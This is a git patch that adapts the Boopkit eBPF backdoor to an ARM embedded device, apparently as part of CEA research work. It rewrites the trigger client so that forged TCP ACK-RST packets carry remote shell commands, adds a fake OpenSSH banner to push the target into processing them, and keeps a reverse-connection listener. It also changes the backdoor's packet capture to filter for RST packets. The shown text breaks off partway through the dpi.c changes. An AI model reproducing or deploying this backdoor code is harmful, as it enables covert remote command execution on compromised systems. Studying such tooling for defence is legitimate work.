From 528456a1a98ee363ac60218eba6495a5b7ba13cb Mon Sep 17 00:00:00 2001
From: =?UTF-8?q?Alo=C3=AFs=20Champenois?= <alois.champenois@cea.fr>
Date: Mon, 18 Aug 2025 11:25:29 +0200
Subject: [PATCH] Patch Boopkit Hendrics

---
 .gitignore          |   1 +
 Makefile            |  19 +++--
 boop/boopkit-boop.c | 128 ++++++++++++++++---------------
 boop/packets.c      | 182 +++++++++++++++++++++++++++++++++++++++++++-
 boop/packets.h      |   4 +-
 boopkit.c           |   1 +
 contrib/.gitkeep    |   0
 contrib/deps        |  34 ---------
 dpi.c               | 105 +++++++++++++------------
 dpi.h               |   2 +-
 pr0be.boop.c        |  43 +++++++----
 pr0be.safe.c        |   3 +-
 12 files changed, 357 insertions(+), 165 deletions(-)
 mode change 100644 => 100755 .gitignore
 mode change 100644 => 100755 Makefile
 mode change 100644 => 100755 boop/boopkit-boop.c
 mode change 100644 => 100755 boop/packets.c
 mode change 100644 => 100755 boop/packets.h
 mode change 100644 => 100755 boopkit.c
 delete mode 100644 contrib/.gitkeep
 delete mode 100755 contrib/deps
 mode change 100644 => 100755 dpi.c
 mode change 100644 => 100755 dpi.h
 mode change 100644 => 100755 pr0be.boop.c
 mode change 100644 => 100755 pr0be.safe.c

diff --git a/.gitignore b/.gitignore
old mode 100644
new mode 100755
index 9b9a402..56cec7c
--- a/.gitignore
+++ b/.gitignore
@@ -7,4 +7,5 @@ boop/bookit-boop
 boopkit
 pr0be.skel*
 vmlinux.h
+vmlinux
 xdp-tools*
\ No newline at end of file
diff --git a/Makefile b/Makefile
old mode 100644
new mode 100755
index b01eb6f..4c34229
--- a/Makefile
+++ b/Makefile
@@ -20,7 +20,7 @@
 # ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
 #
 TARGET  := boopkit
-CFLAGS  ?= -I/usr/local/include -g
+CFLAGS  ?= -g
 LDFLAGS ?=
 LIBS     = -lbpf -lelf -lpcap -lpthread
 STYLE    = Google
@@ -58,7 +58,7 @@ format: ## Format the code
 
 build: boop ## Build boopkit userspace program
 	@echo "  ->  Building boopkit"
-	clang $(CFLAGS) $(LDFLAGS) $(LIBS) -o $(TARGET) boopkit.c common.c dpi.c -Wl,
+	arm-buildroot-linux-gnueabihf-gcc $(CFLAGS) $(LDFLAGS) -o $(TARGET) boopkit.c common.c dpi.c $(LIBS)
 
 .PHONY: contrib
 contrib: ## Build static dependencies
@@ -79,12 +79,12 @@ install: ## Install boopkit to /usr/bin/boopkit
 	cp pr0be.xdp.o ${HOME}/.boopkit/pr0be.xdp.o
 
 
-.PHONY: pr0be
-pr0be: autogen pr0be.boop.o pr0be.safe.o pr0be.xdp.o ## Compile eBPF probes
+.PHONY:  pr0be
+pr0be: pr0be.boop.o pr0be.safe.o pr0be.xdp.o ## Compile eBPF probes
 	@echo "  ->  Building eBPF pr0bes"
 
 autogen:
-	bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
+	bpftool btf dump file ./vmlinux format c > vmlinux.h
 
 pr0be.boop.o: pr0be.boop.c
 	@echo "  ->  Building pr0be.boop.o"
@@ -94,6 +94,9 @@ pr0be.boop.o: pr0be.boop.c
 	    $(CFLAGS) \
 	    -Wall \
 	    -Werror \
+		-nostdinc \
+		-I/${CURDIR}/../../../embedded-device/buildroot/output/host/include/ \
+		-I/${CURDIR}/../../../embedded-device/buildroot/output/host/include/bpf \
 	    -O2 -emit-llvm -c -g pr0be.boop.c
 	llc -march=bpf -filetype=obj -o pr0be.boop.o pr0be.boop.ll
 
@@ -105,6 +108,9 @@ pr0be.safe.o: pr0be.safe.c
 	    $(CFLAGS) \
 	    -Wall \
 	    -Werror \
+		-nostdinc \
+		-I/${CURDIR}/../../../embedded-device/buildroot/output/host/include/ \
+		-I/${CURDIR}/../../../embedded-device/buildroot/output/host/include/bpf \
 	    -O2 -emit-llvm -c -g pr0be.safe.c
 	llc -march=bpf -filetype=obj -o pr0be.safe.o pr0be.safe.ll
 
@@ -116,6 +122,9 @@ pr0be.xdp.o: pr0be.xdp.c
 	    $(CFLAGS) \
 	    -Wall \
 	    -Werror \
+		-nostdinc \
+		-I/${CURDIR}/../../../embedded-device/buildroot/output/host/include/ \
+		-I/${CURDIR}/../../../embedded-device/buildroot/output/host/include/bpf \
 	    -O2 -emit-llvm -c -g pr0be.xdp.c
 	llc -march=bpf -filetype=obj -o pr0be.xdp.o pr0be.xdp.ll
 
diff --git a/boop/boopkit-boop.c b/boop/boopkit-boop.c
old mode 100644
new mode 100755
index f0a769d..d499c81
--- a/boop/boopkit-boop.c
+++ b/boop/boopkit-boop.c
@@ -108,6 +108,9 @@ void clisetup(int argc, char **argv) {
     if (strncmp(argv[i], "-rhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1) {
       strncpy(cfg.rhost, argv[i + 1], MAX_ARG_LEN);
     }
+    if (strcmp(argv[i], "-r") == 0) {
+      cfg.reverseconn = 1;
+    }
     if (argv[i][0] == '-') {
       switch (argv[i][1]) {
         case 'h':
@@ -119,9 +122,6 @@ void clisetup(int argc, char **argv) {
         case 'q':
           quiet = 1;
           break;
-        case 'r':
-          cfg.reverseconn = 1;
-          break;
         case 'x':
           cfg.synonly = 1;
           break;
@@ -191,8 +191,7 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
   }
   int clientsock;
   int addrlen = sizeof laddr;
-  if ((clientsock = accept(servesock, (struct sockaddr *)&laddr,
-                           (socklen_t *)&addrlen)) < 0) {
+  if ((clientsock = accept(servesock, (struct sockaddr *)&laddr, (socklen_t *)&addrlen)) < 0) {
     boopprintf(" XX Socket accept failure: %s\n", listenstr);
     return 1;
   }
@@ -243,13 +242,10 @@ int main(int argc, char **argv) {
   char payload[MAX_RCE_SIZE];
   if (cfg.halt) {
     cfg.reverseconn = 0;
-    strncpy(cfg.rce, BOOPKIT_RCE_CMD_HALT,
-            MAX_RCE_SIZE);  // Overwrite command with halt command!
+    strncpy(cfg.rce, BOOPKIT_RCE_CMD_HALT, MAX_RCE_SIZE);  // Overwrite command with halt command!
   }
-  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce,
-          BOOPKIT_RCE_DELIMITER);
+  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce, BOOPKIT_RCE_DELIMITER);
 
-  // Echo vars
   boopprintf("  -> *[RCE]     : %s\n", cfg.rce);
   boopprintf("  -> *[Local]   : %s:%s\n", cfg.lhost, cfg.lport);
   boopprintf("  -> *[Remote]  : %s:%s\n", cfg.rhost, cfg.rport);
@@ -258,6 +254,10 @@ int main(int argc, char **argv) {
   // ===========================================================================
   // 1. Bad checksum SYN SOCK_RAW (Connectionless)
   //
+  //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+  // Disabled for CEA, this trigger doesn't work on the target embedded system
+  //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+  //
   // Send a bad TCP checksum packet to any TCP socket. Regardless if a server
   // is running. The kernel will still trigger a bad TCP checksum event.
   //
@@ -265,6 +265,9 @@ int main(int argc, char **argv) {
   // do our dirty work.
   //
   // [Socket] SOCK_RAW Reliably-delivered messages over connectionless socket!
+  int packet_len;
+  int sent=0;
+  /*
   int sock1 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
   if (sock1 == -1) {
     boopprintf("Socket SOCK_RAW creation failed\n");
@@ -276,21 +279,17 @@ int main(int argc, char **argv) {
     return 1;
   }
   // [SYN] Send a packet with a 0 checksum!
-  int packet_len;
 
-  // Create a malformed TCP packet with an arbitrary command payload attached to
-  // the packet.
+  // Create a malformed TCP packet with an arbitrary command payload attached to the packet.
   create_bad_syn_packet_payload(&saddr, &daddr, &packet, &packet_len, payload);
-  int sent;
-  sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr,
-                sizeof(struct sockaddr));
+  sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr, sizeof(struct sockaddr));
   if (sent == -1) {
     boopprintf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
     return 2;
   }
-  boopprintf("  -> [%03d bytes]   TX SYN     : %s (SOCK_RAW, RCE, *bad csum)\n", sent,
-             cfg.rhost, cfg.rport);
+  boopprintf("  -> [%03d bytes]   TX SYN     : %s (SOCK_RAW, RCE, *bad csum)\n", sent, cfg.rhost, cfg.rport);
   close(sock1);
+  */
   // ===========================================================================
 
   if (cfg.synonly) {
@@ -298,32 +297,11 @@ int main(int argc, char **argv) {
     return 0;
   }
 
+  
   // ===========================================================================
-  // 2. TCP SOCK_STREAM Connection
-  //
-  // Here we have a connection based socket. This connection is not required
-  // for a "boop". However, we use this to validate we can truly communicate
-  // with the backend server. A failure to configure a SOCK_STREAM socket
-  // against a boop, can indicate we aren't just firing into the abyss.
-  //
-  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
-  int sock2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-  if (sock2 == -1) {
-    boopprintf("Socket creation failed\n");
-    return 1;
-  }
-  if (connect(sock2, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    boopprintf("Connection SOCK_STREAM refused.\n");
-    return 2;
-  }
-  boopprintf("  -> [handshake]   CONN       : %s:%s\n", cfg.rhost, cfg.rport);
-  close(sock2);
-  // ===========================================================================
-
-  // ===========================================================================
-  // 3. TCP Reset SOCK_RAW
+  // 2. TCP Reset SOCK_RAW
   //
-  // This is the 3rd mechanism we use to boop a server.
+  // This is the 2nd mechanism we use to boop a server.
   // Here we complete a TCP handshake, however we also flip the RST header bit
   // in the hopes of trigger a TCP reset via a boop TCP service.
   //
@@ -332,50 +310,80 @@ int main(int argc, char **argv) {
   // risk as it boops through an application.
   //
   // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
-  int sock3 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-  if (sock3 == -1) {
+  int sock2 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+  if (sock2 == -1) {
     boopprintf("Socket SOCK_RAW creation failed\n");
     return 1;
   }
   // [Socket] IP_HDRINCL Header Include
-  if (setsockopt(sock3, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
+  if (setsockopt(sock2, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
     boopprintf("Unable to set socket option [IP_HDRINCL]\n");
     return 1;
   }
   create_syn_packet(&saddr, &daddr, &packet, &packet_len);
-  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
-                     sizeof(struct sockaddr))) == -1) {
+  if ((sent = sendto(sock2, packet, packet_len, 0, (struct sockaddr *)&daddr, sizeof(struct sockaddr))) == -1) {
     boopprintf("Unable to send RST over SOCK_STREAM.\n");
     return 2;
   }
-  boopprintf("  -> [%03d bytes]   TX SYN     : %s:%s\n", sent, cfg.rhost,
-             cfg.rport);
+  boopprintf("  -> [%03d bytes]   TX SYN     : %s:%s\n", sent, cfg.rhost, cfg.rport);
   char recvbuf[DATAGRAM_LEN];
-  int received = receive_from(sock3, recvbuf, sizeof(recvbuf), &saddr);
+  int received = receive_from(sock2, recvbuf, sizeof(recvbuf), &saddr);
   if (received <= 0) {
     boopprintf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
     return 3;
   }
-  boopprintf("  <- [%03d bytes]   RX SYN-ACK : %s:%s (RCE)\n", received,
-             cfg.rhost, cfg.rport);
+  boopprintf("  <- [%03d bytes]   RX SYN-ACK : %s:%s (RCE)\n", received, cfg.rhost, cfg.rport);
   uint32_t seq_num, ack_num;
   read_seq_and_ack(recvbuf, &seq_num, &ack_num);
   int new_seq_num = seq_num + 1;
-  create_ack_rst_packet(&saddr, &daddr, ack_num, new_seq_num, &packet,
-                        &packet_len);
-  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
-                     sizeof(struct sockaddr))) == -1) {
+
+  //Modified this function prototype to pass it the payload (CEA)
+  create_ack_rst_packet(&saddr, &daddr, ack_num, new_seq_num, &packet, &packet_len,payload);
+  if ((sent = sendto(sock2, packet, packet_len, 0, (struct sockaddr *)&daddr, sizeof(struct sockaddr))) == -1) {
     boopprintf("Unable to send ACK-RST over SOCK_STREAM.\n");
     return 2;
   }
-  boopprintf("  -> [%03d bytes]   TX ACK-RST : %s:%s\n", sent, cfg.rhost,
-             cfg.rport);
+  boopprintf("  -> [%03d bytes]   TX ACK-RST : %s:%s\n", sent, cfg.rhost, cfg.rport);
+  close(sock2);
+  sleep(1);
+  // ===========================================================================
+
+
+  // ===========================================================================
+  // 3. TCP SOCK_STREAM Connection
+  //
+  // This is a regular TCP connection using SOCK_STREAM to ensure the
+  // target is reachable and accepting connections. A failure to establish 
+  // a SOCK_STREAM connection may indicate that the target is down or unreachable.
+  //
+  // This connection also plays a crucial role in triggering the RST processing on the target.
+  // In some systems, a TCP RST received while no connection is active may be buffered
+  // or delayed in processing. By creating a valid connection on the same port,
+  // we ensure the RST is finally processed and observed by the eBPF tracepoint.
+  //
+  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
+  int sock3 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (sock3 == -1) {
+    boopprintf("Socket creation failed\n");
+    return 1;
+  }
+  if (connect(sock3, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
+    boopprintf("Connection SOCK_STREAM refused.\n");
+    return 2;
+  }
+  boopprintf("  -> [handshake]   CONN       : %s:%s\n", cfg.rhost, cfg.rport);
+
+  const char *ssh_banner = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13\r\n";
+  send(sock3, ssh_banner, strlen(ssh_banner), 0);
+
+  sleep(2);
   close(sock3);
   // ===========================================================================
 
+
+  // If the reverse connection parameter (-r) is set, start a listener on lhost:lport.
   if (cfg.reverseconn) {
-    boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost,
-               cfg.lport);
+    boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost, cfg.lport);
     int errno;
     errno = serverce(saddrstr, cfg.rce);
     if (errno != 0) {
diff --git a/boop/packets.c b/boop/packets.c
old mode 100644
new mode 100755
index 588a9eb..3b30694
--- a/boop/packets.c
+++ b/boop/packets.c
@@ -25,6 +25,7 @@
 #include <netinet/tcp.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdio.h>
 
 // clang-format off
 #include "packets.h"
@@ -175,7 +176,7 @@ void create_ack_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
   free(pseudogram);
 }
 
-void create_ack_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
+/*void create_ack_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                            int32_t seq, int32_t ack_seq, char **out_packet,
                            int *out_packet_len) {
   char *datagram = calloc(DATAGRAM_LEN, sizeof(char));
@@ -288,6 +289,185 @@ void create_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
   *out_packet = datagram;
   *out_packet_len = iph->tot_len;
   free(pseudogram);
+}*/
+
+//Modified version for CEA 
+void create_ack_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
+                           int32_t seq, int32_t ack_seq, char **out_packet,
+                           int *out_packet_len, char * payload) {
+  char *datagram = calloc(DATAGRAM_LEN, sizeof(char));
+  struct iphdr *iph = (struct iphdr *)datagram;
+  struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
+  struct pseudo_header psh;
+
+  // IP header configuration
+  iph->ihl = 5;
+  iph->version = 4;
+  iph->tos = 0;
+  iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE;
+  iph->id = htonl(rand() % 65535);  // id of this packet
+  iph->frag_off = 0;
+  iph->ttl = 64;
+  iph->protocol = IPPROTO_TCP;
+  iph->check = 0;  // correct calculation follows later
+  iph->saddr = src->sin_addr.s_addr;
+  iph->daddr = dst->sin_addr.s_addr;
+
+  // TCP header configuration
+  tcph->source = src->sin_port;
+  tcph->dest = dst->sin_port;
+  tcph->seq = htonl(seq);
+  tcph->ack_seq = htonl(ack_seq);
+  tcph->doff = 10;  // tcp header size
+  tcph->fin = 0;
+  tcph->syn = 0;
+  tcph->rst = 1;
+  tcph->psh = 0;
+  tcph->ack = 1;
+  tcph->urg = 0;
+  tcph->check = 0;             // correct calculation follows later
+  tcph->window = htons(5840);  // window size
+  tcph->urg_ptr = 0;
+
+  // TCP pseudo header for checksum calculation
+  psh.source_address = src->sin_addr.s_addr;
+  psh.dest_address = dst->sin_addr.s_addr;
+  psh.placeholder = 0;
+  psh.protocol = IPPROTO_TCP;
+  psh.tcp_length = htons(sizeof(struct tcphdr) + OPT_SIZE + strlen(payload)+4);
+  int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE + strlen(payload)+4;
+  // fill pseudo packet
+  char *pseudogram = malloc(psize);
+  memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
+  memcpy(pseudogram + sizeof(struct pseudo_header), tcph,
+         sizeof(struct tcphdr) + OPT_SIZE);
+  memcpy(pseudogram + sizeof(struct pseudo_header)+sizeof(struct tcphdr) + OPT_SIZE, payload, strlen(payload)+4);
+  // TCP options are only set in the SYN packet
+  // ---- set mss ----
+  datagram[40] = 0x00;
+  datagram[41] = 0x00;
+  int16_t mss = htons(48);  // mss value
+  memcpy(datagram + 42, &mss, sizeof(int16_t));
+  // ---- enable SACK ----
+  datagram[44] = 0x00;
+  datagram[45] = 0x00;
+
+  // [46] begin data transmission for datagram
+  // Append the payload to the datagram
+  int offset = 60;
+  int i = 0;
+  for (i = 0; i < strlen(payload); i++) {
+    datagram[offset + i] = payload[i];
+  }
+  datagram[offset + strlen(payload) + 1] = '\0';
+  datagram[offset + strlen(payload) + 2] = '\0';
+  datagram[offset + strlen(payload) + 3] = '#';
+
+  pseudogram[psize-3] = '\0';
+  pseudogram[psize-2] = '\0';
+  pseudogram[psize-1] = '#';
+
+
+  // do the same for the pseudo header
+  pseudogram[32] = 0x00;
+  pseudogram[33] = 0x00;
+  memcpy(pseudogram + 34, &mss, sizeof(int16_t));
+  pseudogram[36] = 0x00;
+  pseudogram[37] = 0x00;
+
+  tcph->check = csum((const char *)pseudogram, psize);
+  iph->check = csum((const char *)datagram, iph->tot_len+ strlen(payload) + 4);
+
+  *out_packet = datagram;
+  *out_packet_len = iph->tot_len+ strlen(payload) + 4;
+  
+  free(pseudogram);
+}
+
+
+void create_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
+                       char **out_packet, int *out_packet_len, char *payload) {
+  char *datagram = calloc(DATAGRAM_LEN, sizeof(char));
+  struct iphdr *iph = (struct iphdr *)datagram;
+  struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
+  struct pseudo_header psh;
+
+  // IP header configuration
+  iph->ihl = 5;
+  iph->version = 4;
+  iph->tos = 0;
+  iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE;
+  iph->id = htonl(rand() % 65535);  // id of this packet
+  iph->frag_off = 0;
+  iph->ttl = 64;
+  iph->protocol = IPPROTO_TCP;
+  iph->check = 0;  // correct calculation follows later
+  iph->saddr = src->sin_addr.s_addr;
+  iph->daddr = dst->sin_addr.s_addr;
+
+  // TCP header configuration
+  tcph->source = src->sin_port;
+  tcph->dest = dst->sin_port;
+  tcph->seq = htonl(rand() % 4294967295);
+  tcph->ack_seq = htonl(0);
+  tcph->doff = 10;  // tcp header size
+  tcph->fin = 0;
+  tcph->syn = 1;
+  tcph->rst = 1;
+  tcph->psh = 0;
+  tcph->ack = 0;
+  tcph->urg = 0;
+  tcph->check = 0;             // correct calculation follows later
+  tcph->window = htons(5840);  // window size
+  tcph->urg_ptr = 0;
+
+  // TCP pseudo header for checksum calculation
+  psh.source_address = src->sin_addr.s_addr;
+  psh.dest_address = dst->sin_addr.s_addr;
+  psh.placeholder = 0;
+  psh.protocol = IPPROTO_TCP;
+  psh.tcp_length = htons(sizeof(struct tcphdr) + OPT_SIZE);
+  int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE;
+  // fill pseudo packet
+  char *pseudogram = malloc(psize);
+  memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
+  memcpy(pseudogram + sizeof(struct pseudo_header), tcph,
+         sizeof(struct tcphdr) + OPT_SIZE);
+
+  // TCP options are only set in the SYN packet
+  // ---- set mss ----
+  datagram[40] = 0x00;
+  datagram[41] = 0x00;
+  int16_t mss = htons(48);  // mss value
+  memcpy(datagram + 42, &mss, sizeof(int16_t));
+  // ---- enable SACK ----
+  datagram[44] = 0x00;
+  datagram[45] = 0x00;
+
+  // [46] begin data transmission for datagram
+  // Append the payload to the datagram
+  int offset = 46;
+  int i = 0;
+  for (i = 0; i < strlen(payload); i++) {
+    datagram[offset + i] = payload[i];
+  }
+  datagram[offset + strlen(payload) + 1] = '\0';
+  datagram[offset + strlen(payload) + 2] = '\0';
+  datagram[offset + strlen(payload) + 3] = '#';
+
+  // do the same for the pseudo header
+  pseudogram[32] = 0x00;
+  pseudogram[33] = 0x00;
+  memcpy(pseudogram + 34, &mss, sizeof(int16_t));
+  pseudogram[36] = 0x00;
+  pseudogram[37] = 0x00;
+
+  tcph->check = csum((const char *)pseudogram, psize);
+  iph->check = csum((const char *)datagram, iph->tot_len+ strlen(payload) + 3);
+
+  *out_packet = datagram;
+  *out_packet_len = iph->tot_len+ strlen(payload) + 3;
+  free(pseudogram);
 }
 
 // create_bad_syn_packet_payload will build a TCP SYN packet with an arbitrary
diff --git a/boop/packets.h b/boop/packets.h
old mode 100644
new mode 100755
index 22e19f9..a9f2adf
--- a/boop/packets.h
+++ b/boop/packets.h
@@ -45,9 +45,9 @@ void create_ack_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                        int *out_packet_len);
 void create_ack_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                            int32_t seq, int32_t ack_seq, char **out_packet,
-                           int *out_packet_len);
+                           int *out_packet_len,char*payload);
 void create_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
-                       char **out_packet, int *out_packet_len);
+                       char **out_packet, int *out_packet_len,char*payload);
 void create_bad_syn_packet_payload(struct sockaddr_in *src,
                                    struct sockaddr_in *dst, char **out_packet,
                                    int *out_packet_len, char *payload);
diff --git a/boopkit.c b/boopkit.c
old mode 100644
new mode 100755
index 7c4161c..f94e59a
--- a/boopkit.c
+++ b/boopkit.c
@@ -466,6 +466,7 @@ int main(int argc, char **argv) {
         }
       }
 
+      free(rce);
       bpf_map_delete_elem(fd, &jkey);
       ikey = jkey;
     }
diff --git a/contrib/.gitkeep b/contrib/.gitkeep
deleted file mode 100644
index e69de29..0000000
diff --git a/contrib/deps b/contrib/deps
deleted file mode 100755
index 024b578..0000000
--- a/contrib/deps
+++ /dev/null
@@ -1,34 +0,0 @@
-#!/bin/bash
-# Copyright © 2022 Kris Nóva <kris@nivenly.com>
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#     http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
-#
-# ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
-# ████╗  ██║██╔═████╗██║   ██║██╔══██╗
-# ██╔██╗ ██║██║██╔██║██║   ██║███████║
-# ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
-# ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
-# ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
-#
-
-# [ Arch linux only ]
-
-dep() {
-    echo "  ->  $1"
-    yay -G $1
-    cd $1/trunk
-    emacs PKGBUILD
-    makepkg -si
-}
-
-dep glibc
\ No newline at end of file
diff --git a/dpi.c b/dpi.c
old mode 100644
new mode 100755
index 7407d25..818a4d9
--- a/dpi.c
+++ b/dpi.c
@@ -68,7 +68,7 @@ void xpack_dump(xcap_ip_packet *xpack) {
   boopprintf("  -> Dumping Raw Xpack:\n");
   unsigned char *packet = xpack->packet;
   for (int j = 0; j < xpack->header->caplen; j++) {
-    boopprintf("%c", packet[j]);
+    boopprintf("%x", packet[j]);
   }
   boopprintf("\n");
 }
@@ -168,8 +168,7 @@ int rce_filter(char *raw, char *rce) {
  */
 void *xcap(void *v_dev_name) {
   char *dev_name = (char *)v_dev_name;
-  char filter_exp[] = "";
-  int cycle = 0;
+  char filter_exp[] = "tcp[tcpflags] & tcp-rst != 0";
 
   pcap_t *handle;
   char errbuf[PCAP_ERRBUF_SIZE];
@@ -228,15 +227,6 @@ void *xcap(void *v_dev_name) {
 
     if (xcap_pos == XCAP_BUFFER_SIZE) {
       xcap_pos = 0;
-      cycle = 1;
-    }
-    if (cycle) {
-      pthread_mutex_lock(&lock);
-      free(xcap_ring_buffer[xcap_pos]->packet);
-      free(xcap_ring_buffer[xcap_pos]->iph);
-      free(xcap_ring_buffer[xcap_pos]->header);
-      free(xcap_ring_buffer[xcap_pos]);
-      pthread_mutex_unlock(&lock);
     }
 
     // Write a new xpack to the ring buffer
@@ -248,9 +238,15 @@ void *xcap(void *v_dev_name) {
     memcpy(xpack->packet, packet, header.len);
     memcpy(xpack->iph, iph, sizeof(struct ip));
     memcpy(xpack->header, &header, sizeof(struct pcap_pkthdr));
+
     pthread_mutex_lock(&lock);
+    free(xcap_ring_buffer[xcap_pos]->packet);
+    free(xcap_ring_buffer[xcap_pos]->iph);
+    free(xcap_ring_buffer[xcap_pos]->header);
+    free(xcap_ring_buffer[xcap_pos]);
     xcap_ring_buffer[xcap_pos] = xpack;
     pthread_mutex_unlock(&lock);
+
     xcap_pos++;
   }
 
@@ -260,38 +256,62 @@ void *xcap(void *v_dev_name) {
 }
 
 /**
- * snapshot will effectively lock the global xcap_ring_buffer and take a
- * snapshot of the packets in memory.
+ * Takes a snapshot of the current ring buffer by extracting packets that match a given IP address.
+ * Matching packets are removed from the ring buffer and stored in 'snap' for further processing.
+ * Non-matching or empty slots are filled with empty packet structures.
  *
  * @param snap a fresh copy of the memory when the snapshot was taken.
  * @return 1 success
  */
-int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
+int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE], char search[INET_ADDRSTRLEN]) {
   boopprintf("  -> Taking snapshot of network traffic.\n");
   pthread_mutex_lock(&lock);
+
+  // Iterate over the entire ring buffer
   for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
-    struct xcap_ip_packet *from = xcap_ring_buffer[i];
-    struct xcap_ip_packet *to = malloc(sizeof(xcap_ip_packet));
-    if (!from->captured) {
+    struct xcap_ip_packet *ring_buffer = xcap_ring_buffer[i];
+
+    // Case 1: No packet was captured in this slot
+    if (!ring_buffer->captured) {
+      // Allocate and initialize an empty packet in the snapshot
+      struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));
+      xpack->packet = malloc(1);  // Init to 1 byte to begin!
+      xpack->iph = malloc(sizeof(struct ip));
+      xpack->header = malloc(sizeof(struct pcap_pkthdr));
+      xpack->captured = 0;
+      snap[i] = xpack;
       continue;
     }
 
-    // capture
-    to->captured = from->captured;
-
-    // packet
-    to->packet = malloc(from->header->caplen);
-    memcpy(to->packet, from->packet, from->header->caplen);
-
-    // iph
-    to->iph = malloc(sizeof(struct ip));
-    memcpy(to->iph, from->iph, sizeof(struct ip));
+    // Case 2: Packet was captured, but source IP doesn't match the filter
+    char *xpack_saddr = inet_ntoa(ring_buffer->iph->ip_src);
+    char *ret = strstr(search, xpack_saddr); // Check if IP matches filter
+    if (!ret) {
+      // Still allocate an empty snapshot entry to preserve array structure
+      struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));
+      xpack->packet = malloc(1);  // Init to 1 byte to begin!
+      xpack->iph = malloc(sizeof(struct ip));
+      xpack->header = malloc(sizeof(struct pcap_pkthdr));
+      xpack->captured = 0;
+      snap[i] = xpack;
+      continue;  
+    }
 
-    // header
-    to->header = malloc(sizeof(struct pcap_pkthdr));
-    memcpy(to->header, from->header, sizeof(struct pcap_pkthdr));
-    snap[i] = to;
+    // Case 3: Packet matches the filter, move it from ring buffer to snapshot
+    struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));
+    xpack->packet = ring_buffer->packet;
+    xpack->iph = ring_buffer->iph;
+    xpack->header = ring_buffer->header;
+    xpack->captured = ring_buffer->captured;
+    snap[i] = xpack;
+
+    // Reset the ring buffer slot with fresh memory for future captures
+    ring_buffer->packet = malloc(1);  // Init to 1 byte to begin!
+    ring_buffer->iph = malloc(sizeof(struct ip));
+    ring_buffer->header = malloc(sizeof(struct pcap_pkthdr));
+    ring_buffer->captured = 0;
   }
+  
   pthread_mutex_unlock(&lock);
   return 1;
 }
@@ -307,8 +327,7 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
   sleep(1);  // Wait for the kernel to catch up :)
   boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
   xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
-  xcap_ring_buffer_init(snap);
-  snapshot(snap);
+  snapshot(snap, search);
 
   // Search
   for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
@@ -318,14 +337,6 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
       continue;
     }
 
